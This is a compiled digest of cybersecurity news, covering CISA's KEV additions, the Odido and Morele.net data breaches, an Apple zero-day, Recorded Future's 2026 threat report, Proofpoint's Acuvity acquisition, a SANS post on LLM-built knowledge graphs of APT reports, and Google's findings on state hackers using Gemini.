Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[TAM METİN - 358 kelime]
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.

The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.

The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.

The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.

The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.

This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.

[TAM METİN - 423 kelime]
Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido lekt gevoelige gegevens 6,2 miljoen gebruikers: https://t.co/dK8jzwmYY9Adressen, telefoonnummers, geboortedata, emailadressen, bankrekeningnummers, identiteitsbewijzen.. #privacy pic.twitter.com/E5k1aiERfm

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)
────────────────────────────────────────────────────────────────────────────────

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000
Link: https://cyberscoop.com/state-hackers-using-gemini-google-ai/

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

